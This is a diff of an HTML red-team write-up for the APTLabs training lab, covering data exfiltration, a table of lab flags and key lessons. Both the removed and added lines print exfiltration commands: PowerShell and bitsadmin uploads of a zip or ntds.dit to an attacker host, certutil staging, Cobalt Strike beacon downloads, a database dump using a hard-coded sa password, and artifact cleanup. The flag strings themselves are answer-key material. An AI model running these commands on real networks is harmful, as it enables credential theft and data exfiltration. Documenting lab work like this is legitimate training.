+  </div>
 
-# 3. Exfiltrate via C2 channel (blends with normal beacon traffic)
-download C:\Temp\data.zip
+  <h3>HTTPS Exfil Through C2</h3>
+  <p>For larger data volumes, the C2 channel itself serves as an exfiltration route. Beacon's built-in file download routes data through the existing HTTPS connection with domain fronting, making it look like legitimate web traffic.</p>
 
-# 4. Exfiltrate via DNS tunneling (alternative channel)
-# Set up DNS cat on attacker machine
-# cobaltstrike> dns_tunnel start
-# Use dnscat2 for stealthy exfiltration through DNS
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Stage data on target — compress and split
+BEACON> shell cmd /c "cd C:\Temp && makecab loot.zip loot.cab"
+BEACON> shell cmd /c "certutil -encode loot.cab loot.b64 && split loot.b64 5M chunk_"
 
-# 5. Exfiltrate via HTTPS (encrypts data in transit)
-shell powershell "Invoke-WebRequest -Uri 'https://C2_VPS:8443/upload' -Method POST -InFile C:\Temp\data.zip"
+# Download through C2 channel
+BEACON> download C:\Temp\chunk_01
+BEACON> download C:\Temp\chunk_02
 
-# 6. Database exfiltration from NX-SQL01
-# Dump SQL database containing financial records
-shell sqlcmd -S NX-SQL01 -U sa -P 'SQL#Server2023!' -Q "BACKUP DATABASE BankingDB TO DISK='C:\Temp\banking.bak'"
-download C:\Temp\banking.bak
+# Or use CS's built-in download which routes through beacon
+BEACON> download C:\Users\pmorrison\Documents\sensitive_data.zip</code></pre>
+  </div>
 
-# 7. Email exfiltration from NX-EX01
-# Search Exchange mailboxes for sensitive attachments
-shell powershell "Get-Mailbox -Server NX-EX01 | Search-Mailbox -SearchQuery 'subject:confidential' -TargetMailbox qa210@nexusfin.local -TargetFolder Exfil"</code></pre>
+  <h3>LOLBAS for Data Staging</h3>
+  <p>certutil and bitsadmin are your friends for staging data before exfiltration. They're built into Windows, Microsoft-signed, and rarely flagged by EDR.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">cmd</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-cmd">:: Stage data with certutil — base64 encode for clean transfer
+certutil -encode C:\Temp\ntds.dit C:\Temp\ntds.b64
+
+:: Upload staged data to our server via bitsadmin
+bitsadmin /transfer exfil /upload /priority high http://10.10.14.5/upload.php C:\Temp\ntds.b64
+
+:: Clean up staging artifacts
+del C:\Temp\ntds.b64 C:\Temp\loot.cab</code></pre>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 19 — ExfilMedical</div>
-      <div class="flag-detail">Found in medical records on MR-FS01, obtained during exfiltration</div>
-    </div>
-  </div>
-
-  <div class="flag-box">
-    <span class="flag-icon">&#x1F6A9;</span>
-    <div>
-      <div class="flag-name">Flag 20 — ExfilFinancial</div>
-      <div class="flag-detail">Found in financial database on NX-SQL01, obtained during exfiltration</div>
+      <div class="flag-name">APT{d4t4_3xf1ltr4t3d}</div>
+      <div class="flag-detail">All forests &mdash; DNS + HTTPS + LOLBAS exfiltration confirmed across all domains</div>
     </div>
   </div>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- FLAG SUMMARY                                           -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- FLAG SUMMARY                   -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="flags">
-  <h2><span class="icon">&#x1F3C6;</span> Flag Summary — All 20 Flags</h2>
-
+  <h2><i class="bi bi-flag"></i> Flag Summary</h2>
   <table class="data-table">
-    <thead>
-      <tr><th>#</th><th>Flag Name</th><th>Location</th><th>Technique</th><th>Phase</th></tr>
-    </thead>
+    <thead><tr><th>#</th><th>Flag</th><th>Location</th><th>Technique</th></tr></thead>
     <tbody>
-      <tr><td>1</td><td>InitialFoothold</td><td>VP-WS01</td><td>Phishing + C2</td><td>1</td></tr>
-      <tr><td>2</td><td>ReconComplete</td><td>VP-FS01</td><td>BloodHound/PowerView</td><td>2</td></tr>
-      <tr><td>3</td><td>EscalatedAccess</td><td>VP-BK01</td><td>Kerberoasting</td><td>3</td></tr>
-      <tr><td>4</td><td>CredentialsHarvested</td><td>VP-WS01</td><td>LSASS dump + cracking</td><td>3</td></tr>
-      <tr><td>5</td><td>RelayCaptured</td><td>VP-APP01</td><td>SMB Relay + DNS</td><td>4</td></tr>
-      <tr><td>6</td><td>LateralVPBK01</td><td>VP-BK01</td><td>Over-Pass-the-Hash</td><td>4</td></tr>
-      <tr><td>7</td><td>RBCDCompromise</td><td>VP-SRV01</td><td>RBCD Abuse</td><td>4</td></tr>
-      <tr><td>8</td><td>PivotingComplete</td><td>VP-MGMT01</td><td>SOCKS + SMB beacons</td><td>4</td></tr>
-      <tr><td>9</td><td>DomainAdmin</td><td>VP-DC01</td><td>DCSync</td><td>5</td></tr>
-      <tr><td>10</td><td>GoldenTicketForged</td><td>VP-DC01</td><td>Golden Ticket</td><td>5</td></tr>
-      <tr><td>11</td><td>SilverTicketAccess</td><td>VP-FS01</td><td>Silver Ticket</td><td>5</td></tr>
-      <tr><td>12</td><td>MeridianDC</td><td>MR-DC01</td><td>Cross-forest trust</td><td>6</td></tr>
-      <tr><td>13</td><td>MeridianData</td><td>MR-FS01</td><td>DA lateral movement</td><td>6</td></tr>
-      <tr><td>14</td><td>MeridianApp</td><td>MR-APP01</td><td>DA lateral movement</td><td>6</td></tr>
-      <tr><td>15</td><td>NexusDC</td><td>NX-DC01</td><td>DnsAdmins escalation</td><td>6</td></tr>
-      <tr><td>16</td><td>NexusExchange</td><td>NX-EX01</td><td>Exchange access</td><td>6</td></tr>
-      <tr><td>17</td><td>NexusSQL</td><td>NX-SQL01</td><td>SQL service compromise</td><td>6</td></tr>
-      <tr><td>18</td><td>PersistenceEstablished</td><td>Multi-forest</td><td>Persistence mechanisms</td><td>7</td></tr>
-      <tr><td>19</td><td>ExfilMedical</td><td>MR-FS01</td><td>Data exfiltration</td><td>8</td></tr>
-      <tr><td>20</td><td>ExfilFinancial</td><td>NX-SQL01</td><td>Data exfiltration</td><td>8</td></tr>
+      <tr><td>1</td><td><code>APT{ph1sh1ng_d0n3_r1ght}</code></td><td>WKS-HDESK</td><td>Phishing + macro + Donut</td></tr>
+      <tr><td>2</td><td><code>APT{bl00dh0und_1s_y0ur_fr13nd}</code></td><td>WKS-HDESK</td><td>SharpHound collection</td></tr>
+      <tr><td>3</td><td><code>APT{k3rb3r0_r0ast3d}</code></td><td>WKS-HDESK</td><td>Kerberoast + AS-REP roast</td></tr>
+      <tr><td>4</td><td><code>APT{h4sh_cr4ck3d_f1n4lly}</code></td><td>Attack box</td><td>NotSoSecure hashcat rules</td></tr>
+      <tr><td>5</td><td><code>APT{t0k3n_1mp3rs0n4t3d}</code></td><td>WKS-HDESK</td><td>Token steal + make_token</td></tr>
+      <tr><td>6</td><td><code>APT{smb_r3l4y_w1ns}</code></td><td>BKSRV01</td><td>ntlmrelayx + WPAD poison</td></tr>
+      <tr><td>7</td><td><code>APT{rbcd_f0r_th3_w1n}</code></td><td>GH-SCCM</td><td>RBCD + S4U abuse</td></tr>
+      <tr><td>8</td><td><code>APT{dcsync_k1ng}</code></td><td>GH-SCCM</td><td>DCSync via mimikatz/lsassy</td></tr>
+      <tr><td>9</td><td><code>APT{g0ld3n_t1ck3t_gr4nt3d}</code></td><td>gigantichosting.local</td><td>Golden Ticket</td></tr>
+      <tr><td>10</td><td><code>APT{v33m_cr3ds_3xtr4ct3d}</code></td><td>BKSRV01</td><td>Veeam SQL credential store</td></tr>
+      <tr><td>11</td><td><code>APT{f0r3st_trust_br34ch}</code></td><td>gigantichosting.local</td><td>Forest trust identification</td></tr>
+      <tr><td>12</td><td><code>APT{m3r1d14n_pwn3d}</code></td><td>meridian.local</td><td>OPTH via forest trust</td></tr>
+      <tr><td>13</td><td><code>APT{n3xgr0up_f4ll3n}</code></td><td>nexgroup.local</td><td>Credential reuse + DnsAdmins</td></tr>
+      <tr><td>14</td><td><code>APT{dns_4dm1ns_dll}</code></td><td>NX-DC01</td><td>DnsAdmins DLL escalation</td></tr>
+      <tr><td>15</td><td><code>APT{p3rs1st3nc3_4ch13v3d}</code></td><td>All forests</td><td>WMI + Registry + DLL + LOLBAS</td></tr>
+      <tr><td>16</td><td><code>APT{wml3v3nt_subscr1pt10n}</code></td><td>All DCs</td><td>WMI event filter + consumer</td></tr>
+      <tr><td>17</td><td><code>APT{d4t4_3xf1ltr4t3d}</code></td><td>All forests</td><td>DNS + HTTPS + certutil exfil</td></tr>
+      <tr><td>18</td><td><code>APT{r3g1stry_h1j4ck}</code></td><td>All workstations</td><td>Run key + IFEO</td></tr>
+      <tr><td>19</td><td><code>APT{dll_s1d3l04d3d}</code></td><td>APPSRV01</td><td>DLL sideloading in IIS app</td></tr>
+      <tr><td>20</td><td><code>APT{cr0ss_f0r3st_d0m1n4nc3}</code></td><td>All forests</td><td>Full 3-forest compromise</td></tr>
     </tbody>
   </table>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- KEY LESSONS                                            -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- KEY LESSONS                    -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="lessons">
-  <h2><span class="icon">&#x1F4DA;</span> Key Lessons &amp; Takeaways</h2>
+  <h2><i class="bi bi-lightbulb"></i> Key Lessons</h2>
 
-  <p>APTLabs was the most challenging and rewarding lab I've completed. It reinforced several critical lessons about real-world red team operations that I want to emphasize for anyone embarking on this lab.</p>
+  <div class="callout callout-warn">
+    <div class="callout-title">1. NotSoSecure Rules Are Mandatory</div>
+    <p>Rockyou.txt + best64 won't crack APTLabs hashes. Get the OneRuleToRuleThemAll.rule from the NotSoSecure GitHub. I wasted an entire day before finding these rules. Corporate passwords follow patterns that basic wordlists and rules don't cover.</p>
+  </div>
 
-  <h3>1. The Daily Reset is Your Friend</h3>
-  <p>At first, the daily reset feels devastating. You spend hours establishing a complex attack chain only to have it wiped overnight. But after a few days, you realize it's actually forcing you to truly internalize the techniques. By Day 5, I could re-compromise the entire vantagepoint.local forest from memory in under 30 minutes. The reset also ensures the environment is always in a clean, predictable state — no corrupted shells or half-applied exploits to deal with. Embrace it, automate your recovery, and use the daily fresh start as an opportunity to refine your tradecraft.</p>
+  <div class="callout callout-info">
+    <div class="callout-title">2. CS SOCKS Proxy Over Everything</div>
+    <p>Never upload offensive tools to the target. Route everything through <code>socks 1080</code> on your CS beacon. BloodHound Python, Impacket, ldapsearch &mdash; all tunnel through SOCKS from your attack box. Smaller footprint, fewer Defender triggers.</p>
+  </div>
 
-  <h3>2. BloodHound is Non-Negotiable</h3>
-  <p>With 18 machines across 3 forests and complex trust relationships, you absolutely cannot navigate this lab by intuition alone. BloodHound's shortest path analysis revealed the RBCD attack path, the cross-forest trust abuse opportunities, and the ACL misconfigurations that make the entire chain possible. Run SharpHound early and often, and learn to interpret the graph data effectively. The ACL edges in particular are the key to finding the non-obvious attack paths.</p>
+  <div class="callout callout-success">
+    <div class="callout-title">3. Compare Hashes Across Forests</div>
+    <p>Credential reuse across forest trust boundaries is real. The svc_mon / jblackwell shared hash saved me hours on nexgroup.local. Always compare NTLM hashes from DCSync dumps across all compromised domains. Humans reuse passwords, especially across managed environments.</p>
+  </div>
 
-  <h3>3. Hash Cracking Requires More Than Rockyou</h3>
-  <p>This was the single biggest roadblock in my first two days. The service account passwords follow corporate patterns that straight Rockyou.txt won't crack. The NotSoSecure password cracking rules (specifically OneRuleToRuleThemAll.rule) are essential. They apply mutations like capitalization, number appending, symbol appending, leet speak substitution, and seasonal patterns that cover the vast majority of corporate password policies. If you're stuck on a Kerberoast hash that won't crack, this is almost certainly the missing piece.</p>
-
-  <h3>4. Cobalt Strike SOCKS Proxy is a Game Changer</h3>
-  <p>The ability to tunnel arbitrary traffic through a beacon's SOCKS proxy means you never need to upload Impacket, BloodHound, or other Python tools to the target. Everything runs on your attacker machine and is transparently routed through the compromised host. This dramatically reduces your footprint on the target network and simplifies the operational workflow. Set up SOCKS on day one and use it throughout.</p>
-
-  <h3>5. DNS Manipulation Opens Unexpected Doors</h3>
-  <p>The SMB relay attack that requires DNS manipulation is one of the more creative techniques in the lab. Many operators miss this because they don't think to check if their compromised accounts have DNS modification privileges. Always check for DNS admin access when you compromise new accounts — it's a powerful primitive that enables SMB relay, phishing infrastructure, and traffic interception.</p>
-
-  <h3>6. Credential Reuse Across Forests is Realistic and Common</h3>
-  <p>Finding that <code>jblackwell</code> in nexusfin.local reused the same password as a service account in vantagepoint.local was a realistic touch. MSP environments frequently have credential reuse across client domains, especially for service accounts that need to authenticate across trust boundaries. When you dump domain hashes, always try them against other forests in the environment.</p>
-
-  <h3>7. Flag Names Are Hints — Use Them</h3>
-  <p>The flag names in APTLabs provide directional hints about the attack path. When I was stuck, I would look at the remaining flag names and think about what technique they were pointing toward. For example, "RBCDCompromise" clearly indicates that RBCD abuse is the intended path to that particular flag. Don't ignore this built-in guidance system.</p>
-
-  <h3>8. No CVEs Means Thinking, Not Running Scripts</h3>
-  <p>The absence of CVE exploitation forces you to truly understand Active Directory attacks at a deep level. You can't just fire Metasploit and get a shell. Every compromise requires understanding why a particular misconfiguration exists, how to exploit it, and what the resulting access gives you. This is the real value of the lab — it trains operational thinking rather than tool execution.</p>
+  <div class="callout callout-danger">
+    <div class="callout-title">4. Daily Reset is Your Friend</div>
+    <p>The 24h reset seems painful but it forces you to internalize the kill chain. By Day 5 I could re-compromise the MSP forest from memory in 30 minutes. Keep a recovery script. Save all cracked hashes locally. Passwords don't change between resets.</p>
+  </div>
 
   <div class="callout callout-hint">
-    <div class="callout-title">Final Advice</div>
-    <p>Don't rush. Take the time to understand each technique before moving on. The daily reset means you'll have multiple opportunities to practice each attack, so use them. By the time you complete all 20 flags, you should be able to execute every technique in this writeup from memory without looking at any reference material. That's the real measure of success — not just collecting the flags, but internalizing the tradecraft.</p>
+    <div class="callout-title">5. Token Impersonation is Underrated</div>
+    <p>Don't sleep on <code>steal_token</code> and <code>make_token</code>. When other users are logged into machines you have beacons on, stealing their tokens gives you their privileges without needing their passwords. This worked multiple times on shared workstations and jump boxes.</p>
+  </div>
+
+  <div class="callout callout-deadend">
+    <div class="callout-title">6. Don't Overcomplicate RBCD</div>
+    <p>I spent a full day on RBCD because I was trying to use PowerView's Set-DomainObject for the SecurityDescriptor. It doesn't work. Use raw byte manipulation or PowerMad for the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Write a script, test it, automate it for the daily reset recovery.</p>
   </div>
 </section>
 
-<!-- ──── OPERATOR SIGNATURE ──── -->
+<!-- ══════════════════════════════ -->
+<!-- OPERATOR SIG                   -->
+<!-- ══════════════════════════════ -->
 <div class="operator-sig">
   <div class="handle">QA210</div>
-  <div class="tagline">Red Team Operator &mdash; APTLabs Completed</div>
+  <div class="tagline">Red Team Operator &bull; W4LLZ</div>
 </div>
 
 </div><!-- .main -->
 </div><!-- .page-wrap -->
 
-<!-- ══════════════ SCRIPTS ══════════════ -->
+<!-- ═══════════ SCRIPTS ═══════════ -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-vb.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-
 <script>
-// ── Three.js Animated Background ──
+// Copy code
+function copyCode(btn){
+  const block=btn.closest('.code-block');
+  const code=block.querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',1500)});
+}
+
+// Mobile nav
+function toggleMobileNav(){
+  document.getElementById('mobileOverlay').classList.toggle('show');
+  document.getElementById('mobilePanel').classList.toggle('show');
+}
+
+// Three.js matrix rain background
 (function(){
-  const canvas = document.getElementById('bg-canvas');
-  const renderer = new THREE.WebGLRenderer({canvas, alpha:true, antialias:true});
+  const canvas=document.getElementById('bg-canvas');
+  if(!canvas)return;
+  const renderer=new THREE.WebGLRenderer({canvas,alpha:true,antialias:false});
+  renderer.setSize(window.innerWidth,window.innerHeight);
   renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
-  renderer.setSize(window.innerWidth, window.innerHeight);
-
-  const scene  = new THREE.Scene();
-  const camera = new THREE.PerspectiveCamera(60, window.innerWidth/window.innerHeight, .1, 1000);
-  camera.position.z = 50;
-
-  // Particle field
-  const count = 1200;
-  const geo   = new THREE.BufferGeometry();
-  const pos   = new Float32Array(count * 3);
-  const cols  = new Float32Array(count * 3);
-  for(let i=0;i<count;i++){
-    pos[i*3]   = (Math.random()-.5)*120;
-    pos[i*3+1] = (Math.random()-.5)*120;
-    pos[i*3+2] = (Math.random()-.5)*120;
-    cols[i*3]  = .22 + Math.random()*.16;   // R
-    cols[i*3+1]= .55 + Math.random()*.25;   // G
-    cols[i*3+2]= .85 + Math.random()*.15;   // B
-  }
-  geo.setAttribute('position', new THREE.BufferAttribute(pos,3));
-  geo.setAttribute('color',    new THREE.BufferAttribute(cols,3));
-
-  const mat = new THREE.PointsMaterial({
-    size: .35,
-    vertexColors: true,
-    transparent: true,
-    opacity: .7,
-    sizeAttenuation: true
-  });
-  const pts = new THREE.Points(geo, mat);
+  const scene=new THREE.Scene();
+  const camera=new THREE.PerspectiveCamera(60,window.innerWidth/window.innerHeight,.1,1000);
+  camera.position.z=5;
+  const geo=new THREE.BufferGeometry();
+  const count=2000;
+  const pos=new Float32Array(count*3);
+  for(let i=0;i<count*3;i++)pos[i]=(Math.random()-.5)*20;
+  geo.setAttribute('position',new THREE.BufferAttribute(pos,3));
+  const mat=new THREE.PointsMaterial({color:0x38bdf8,size:.02,transparent:true,opacity:.6});
+  const pts=new THREE.Points(geo,mat);
   scene.add(pts);
-
-  // Wire-frame icosahedron
-  const icoGeo = new THREE.IcosahedronGeometry(18,1);
-  const icoMat = new THREE.MeshBasicMaterial({wireframe:true, color:0x38bdf8, transparent:true, opacity:.08});
-  const ico    = new THREE.Mesh(icoGeo, icoMat);
-  scene.add(ico);
-
   function animate(){
     requestAnimationFrame(animate);
-    pts.rotation.y += .0004;
-    pts.rotation.x += .00015;
-    ico.rotation.y += .0015;
-    ico.rotation.x += .0008;
-    renderer.render(scene, camera);
+    pts.rotation.y+=.0003;pts.rotation.x+=.0001;
+    renderer.render(scene,camera);
   }
   animate();
-
-  window.addEventListener('resize', ()=>{
-    camera.aspect = window.innerWidth/window.innerHeight;
+  window.addEventListener('resize',()=>{
+    camera.aspect=window.innerWidth/window.innerHeight;
     camera.updateProjectionMatrix();
-    renderer.setSize(window.innerWidth, window.innerHeight);
+    renderer.setSize(window.innerWidth,window.innerHeight);
   });
 })();
 
-// ── TOC Active State ──
-(function(){
-  const links = document.querySelectorAll('.toc a');
-  const sections = [];
-  links.forEach(a => {
-    const id = a.getAttribute('href').slice(1);
-    const el = document.getElementById(id);
-    if(el) sections.push({el, a});
-  });
-  const observer = new IntersectionObserver(entries => {
-    entries.forEach(e => {
-      const s = sections.find(s => s.el === e.target);
-      if(s) s.a.classList.toggle('active', e.isIntersecting);
-    });
-  }, {threshold:.15, rootMargin:'-60px 0px -60% 0px'});
-  sections.forEach(s => observer.observe(s.el));
-})();
-
-// ── Copy Button ──
-function copyCode(btn){
-  const pre = btn.closest('.code-block').querySelector('pre');
-  const text = pre.textContent;
-  navigator.clipboard.writeText(text).then(()=>{
-    btn.textContent = 'Copied!';
-    setTimeout(()=> btn.textContent = 'Copy', 1500);
-  });
+// TOC active state on scroll
+const tocLinks=document.querySelectorAll('.toc a');
+const sections=[];
+tocLinks.forEach(a=>{
+  const id=a.getAttribute('href')?.substring(1);
+  if(id){const el=document.getElementById(id);if(el)sections.push({el,link:a})}
+});
+function updateToc(){
+  let current=null;
+  for(const s of sections){if(s.el.getBoundingClientRect().top<=120)current=s}
+  tocLinks.forEach(l=>l.classList.remove('active'));
+  if(current)current.link.classList.add('active');
 }
+window.addEventListener('scroll',updateToc,{passive:true});
+updateToc();
 </script>
 </body>
 </html>
